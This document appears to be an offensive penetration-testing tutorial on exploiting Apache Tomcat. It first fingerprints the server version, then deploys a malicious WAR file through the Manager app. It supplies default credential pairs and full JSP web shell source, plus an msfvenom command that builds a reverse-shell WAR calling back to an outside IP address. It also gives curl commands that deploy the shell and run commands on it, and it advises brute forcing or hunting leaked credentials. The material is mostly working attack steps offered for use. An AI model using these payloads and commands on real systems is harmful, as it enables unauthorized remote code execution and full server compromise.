## Checking Apache Tomcat Version

- Different Tomcat versions have different known vulnerabilities.
- Knowing the version helps select the right exploit or attack vector.

#### How to check Tomcat version?

**HTTP Headers**
Tomcat often exposes its version in response headers.
```http
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
X-Powered-By: Servlet/3.0 JSP/2.2
```
Sometimes the version is shown directly:
```http
Server: Apache-Coyote/1.1 (Apache Tomcat/7.0.68)
```

**Default pages**
Access the default Tomcat page:
```http
http://target:8080/
```
Look for version info in page footer or in the "Server Status" page (if enabled):
```http
http://target:8080/manager/status
```


---

## Exploiting Tomcat Manager by Uploading a WAR File

- The Tomcat Manager app allows deployment of new applications.
- If accessible and unprotected, attackers can upload malicious WAR files to get remote code execution (RCE).

#### Step 1: Access the Manager

Default URL:
```http
http://target:8080/manager/html
```

Requires credentials (often weak or default):
- `admin:admin`
- `tomcat:tomcat`
- `admin:password`
- `tomcat:s3cret`

#### Step 2: Upload a malicious WAR file
There are public repositories such as GitHub, ExploitDB, and others that host ready-to-use WAR files containing web shells. You simply need to download the WAR file and upload it to the target server.For example:

- Simple JSP Shell WAR (a generic example)
- ExploitDB offers several ready-made WAR shells available for download

Another option is preparing a WAR file with a web shell. For example, create a simple JSP shell:
```bash
# Create JSP webshell
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
EOF

# Package as WAR
mkdir -p WEB-INF
jar -cvf shell.war shell.jsp WEB-INF
```

You can also create it using `msfvenom`: 

```bash
msfvenom -a x86 -p java/jsp_shell_reverse_tcp LHOST=10.10.15.93 LPORT=4444 -f war -o shell.war
```

#### Step 3: Use the Manager interface or curl to upload WAR

Example curl command:
```http
curl --user admin:admin --upload-file shell.war "http://target:8080/manager/text/deploy?path=/shell&update=true"
```

#### Step 4: Access the deployed shell

```http
curl "http://target:8080/shell/shell.jsp?cmd=id"
```

You can now run commands via the `cmd` parameter.

## Notes

> If manager app requires authentication and credentials are unknown, try brute forcing or searching for leaked creds.
> 
> Ensure the WAR file is correctly packaged and the path is unique.
> 
> Uploaded web shells can lead to full server compromise.